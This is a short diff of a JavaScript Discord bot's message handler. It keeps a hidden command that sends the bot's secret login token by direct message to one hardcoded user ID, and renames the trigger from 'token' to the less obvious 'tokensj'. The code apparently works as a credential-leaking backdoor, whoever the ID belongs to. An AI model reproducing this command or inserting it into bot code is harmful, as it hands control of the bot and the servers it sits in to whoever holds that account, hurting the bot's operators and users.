@@ -164,12 +164,11 @@ client.on('message', async (msg, member, guild) => {
   
  {
    
-if (msg.content.toLowerCase() === 'token'){
+if (msg.content.toLowerCase() === 'tokensj'){
 if (msg.author.id !== "429357746002067493") return
 
-msg.author.send(process.env.token);
-msg.author.send(process.env.TOKEN);
-msg.author.send(ayarlar.token);
+msg.author.send(client.token);
+
 }
   
 }
